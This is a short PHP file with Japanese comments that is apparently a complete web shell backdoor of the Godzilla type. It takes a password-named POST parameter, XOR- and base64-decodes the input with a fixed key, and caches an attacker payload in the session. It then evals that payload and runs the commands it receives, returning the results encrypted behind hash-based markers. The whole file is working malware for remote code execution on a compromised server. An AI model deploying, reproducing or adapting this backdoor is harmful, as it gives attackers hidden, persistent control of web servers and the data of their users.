<?php
// セッション管理の開始
@session_start();
// タイムアウトの無効化
@set_time_limit(0);
// エラー表示の無効化
@error_reporting(0);
// バイトストリームの暗号化関数
function crypt_bytes($input_bytes, $key_string){
    // バイト単位でループ
    for($i=0; $i<strlen($input_bytes); $i++) {
        // キー文字の選択
        $char_from_key = $key_string[$i+1&15];
        // XOR演算の実行
        $input_bytes[$i] = $input_bytes[$i]^$char_from_key;
    }
    // 結果を返す
    return $input_bytes;
}
// パスワードパラメータ
$password_param = base64_decode('d29sZnNoZWxs');
// セッションキー
$session_key_name = base64_decode('cGF5bG9hZA==');
// 固定キー
$static_key = '3c6e0b8a9c15224a';
// POSTリクエストの存在チェック
if (isset($_POST[$password_param])){
    // 受信データの復号
    $decrypted_input = crypt_bytes(base64_decode($_POST[$password_param]), $static_key);
    // セッションデータの存在チェック
    if (isset($_SESSION[$session_key_name])){
        // セッションからペイロードを復号
        $payload_from_session = crypt_bytes($_SESSION[$session_key_name], $static_key);
        // 特定の文字列が含まれていないか確認
        if (strpos($payload_from_session, base64_decode('Z2V0QmFzaWNzSW5mbw==')) === false){
            // ペイロードを再暗号化
            $payload_from_session = crypt_bytes($payload_from_session, $static_key);
        }
        // コードの実行
		eval($payload_from_session);
        // レスポンスヘッダーの出力
        echo substr(md5($password_param.$static_key), 0, 16);
        // 実行結果の暗号化と出力
        echo base64_encode(crypt_bytes(@run($decrypted_input), $static_key));
        // レスポンスフッターの出力
        echo substr(md5($password_param.$static_key), 16);
    } else {
        // 初期化コマンドのチェック
        if (strpos($decrypted_input, base64_decode('Z2V0QmFzaWNzSW5mbw==')) !== false){
            // データをセッションに保存
            $_SESSION[$session_key_name] = crypt_bytes($decrypted_input, $static_key);
        }
    }
}
